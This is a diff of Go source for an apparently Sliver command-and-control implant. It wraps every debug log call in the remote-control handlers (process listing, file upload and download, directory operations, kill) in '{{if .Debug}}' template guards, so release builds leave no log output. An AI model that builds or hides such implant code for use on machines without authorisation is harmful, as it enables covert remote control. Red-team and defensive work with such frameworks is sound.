@@ -7,7 +7,12 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+
+	// {{if .Debug}}
 	"log"
+	// {{else}}
+	// {{end}}
+
 	"os"
 	"path/filepath"
 	pb "sliver/protobuf"
@@ -17,7 +22,9 @@ import (
 
 // ---------------- Cross-platform Handlers ----------------
 func killHandler(send chan pb.Envelope, data []byte) {
+	// {{if .Debug}}
 	log.Printf("Received kill command\n")
+	// {{end}}
 	os.Exit(0)
 }
 
@@ -25,10 +32,14 @@ func pingHandler(send chan pb.Envelope, data []byte) {
 	ping := &pb.Ping{}
 	err := proto.Unmarshal(data, ping)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
+		// {{end}}
 		return
 	}
+	// {{if .Debug}}
 	log.Printf("ping id = %s", ping.Id)
+	// {{end}}
 	data, _ = proto.Marshal(ping)
 	envelope := pb.Envelope{
 		Id:   ping.Id,
@@ -42,15 +53,21 @@ func psHandler(send chan pb.Envelope, data []byte) {
 	psListReq := &pb.ProcessListReq{}
 	err := proto.Unmarshal(data, psListReq)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
+		// {{end}}
 		return
 	}
 	procs, err := Processes()
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("failed to list procs %v", err)
+		// {{end}}
 	}
 
-	psList := &pb.ProcessList{Processes: []*pb.Process{}}
+	psList := &pb.ProcessList{
+		Processes: []*pb.Process{},
+	}
 
 	for _, proc := range procs {
 		psList.Processes = append(psList.Processes, &pb.Process{
@@ -73,7 +90,9 @@ func dirListHandler(send chan pb.Envelope, data []byte) {
 	dirListReq := &pb.DirListReq{}
 	err := proto.Unmarshal(data, dirListReq)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
+		// {{end}}
 		return
 	}
 	dir, files, err := getDirList(dirListReq.Path)
@@ -117,7 +136,9 @@ func rmHandler(send chan pb.Envelope, data []byte) {
 	rmReq := &pb.RmReq{}
 	err := proto.Unmarshal(data, rmReq)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
+		// {{end}}
 		return
 	}
 
@@ -151,7 +172,9 @@ func mkdirHandler(send chan pb.Envelope, data []byte) {
 	mkdirReq := &pb.MkdirReq{}
 	err := proto.Unmarshal(data, mkdirReq)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
+		// {{end}}
 		return
 	}
 
@@ -181,7 +204,9 @@ func cdHandler(send chan pb.Envelope, data []byte) {
 	cdReq := &pb.CdReq{}
 	err := proto.Unmarshal(data, cdReq)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
+		// {{end}}
 		return
 	}
 
@@ -205,7 +230,9 @@ func pwdHandler(send chan pb.Envelope, data []byte) {
 	pwdReq := &pb.PwdReq{}
 	err := proto.Unmarshal(data, pwdReq)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
+		// {{end}}
 		return
 	}
 
@@ -229,7 +256,9 @@ func downloadHandler(send chan pb.Envelope, data []byte) {
 	downloadReq := &pb.DownloadReq{}
 	err := proto.Unmarshal(data, downloadReq)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
+		// {{end}}
 		return
 	}
 	target, _ := filepath.Abs(downloadReq.Path)
@@ -262,7 +291,9 @@ func uploadHandler(send chan pb.Envelope, data []byte) {
 	uploadReq := &pb.UploadReq{}
 	err := proto.Unmarshal(data, uploadReq)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
+		// {{end}}
 		return
 	}
 
